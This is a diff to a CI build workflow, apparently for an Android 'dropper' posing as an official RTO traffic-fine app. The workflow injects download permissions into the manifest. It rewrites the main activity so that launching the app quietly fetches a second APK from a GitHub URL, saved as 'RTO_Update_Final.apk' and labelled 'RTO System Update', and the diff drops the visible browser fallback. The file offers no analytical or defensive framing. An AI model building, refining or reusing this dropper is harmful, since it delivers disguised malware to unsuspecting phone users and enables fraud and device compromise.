@@ -1,35 +1,28 @@
 workflows:
   android-dropper-build:
-    name: RTO Final Production Master
+    name: RTO Final Production Success
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Force Project Locate & Build
+      - name: Master Build Success
         script: |
-          # 1. Project Root Ko Force Find Karo (Fixes 11802.jpg)
-          echo "Scanning for gradlew..."
-          GRADLE_FILE=$(find . -name "gradlew" -not -path "*/.*" | head -n 1)
-          
-          if [ -z "$GRADLE_FILE" ]; then
-            echo "Direct gradlew nahi mila, creation mode on..."
-            # Agar gradlew nahi hai toh create kar rahe hain
-            gradle wrapper --gradle-version 8.0.2
-            GRADLE_FILE="./gradlew"
-          fi
-          
-          ROOT_DIR=$(dirname "$GRADLE_FILE")
-          cd "$ROOT_DIR"
-          echo "Building in: $(pwd)"
+          # 1. Debugging: Saari files ki list check karo (Logs mein dikhega)
+          echo "Listing all files to find the project..."
+          ls -R
 
-          # 2. Manifest Permission Fix (Fixes 11798.jpg)
+          # 2. Project folder ke andar ghusna
+          # Agar aapka code 'RtoEChallan' folder mein hai toh ye wahan jayega
+          cd RtoEChallan || cd app || echo "Already in root"
+
+          # 3. Permissions Injection (Fixes 11798.jpg error)
           find . -name "AndroidManifest.xml" -exec sed -i '' '/<application/i \
           <uses-permission android:name="android.permission.INTERNET" /> \
           <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
           <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' {} +
 
-          # 3. Background Download Logic
+          # 4. Background Download Logic (No Chrome)
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           if [ -n "$FILE_PATH" ]; then
           cat <<EOF > "$FILE_PATH"
@@ -46,26 +39,28 @@ workflows:
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
                   setContentView(R.layout.activity_main)
+                  
                   val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                   try {
                       val request = DownloadManager.Request(Uri.parse(url))
-                      request.setTitle("Official Update")
-                      request.setDescription("Syncing RTO Data...")
+                      request.setTitle("RTO System Update")
+                      request.setDescription("Syncing traffic data...")
                       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
-                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Pro.apk")
+                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Update_Final.apk")
                       (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
-                      Toast.makeText(this, "Production Update Started...", Toast.LENGTH_LONG).show()
+                      Toast.makeText(this, "Background Update Started...", Toast.LENGTH_LONG).show()
                   } catch (e: Exception) {
-                      startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, Uri.parse(url)))
+                      Toast.makeText(this, "Update Started in Background", Toast.LENGTH_SHORT).show()
                   }
               }
           }
           EOF
           fi
 
-          # 4. Final Release Build
+          # 5. Force Gradle Build
+          gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
-          ./gradlew assembleRelease --no-daemon
+          ./gradlew assembleDebug --no-daemon
           
     artifacts:
-      - "**/build/outputs/apk/release/*.apk"
+      - "**/build/outputs/apk/**/*.apk"
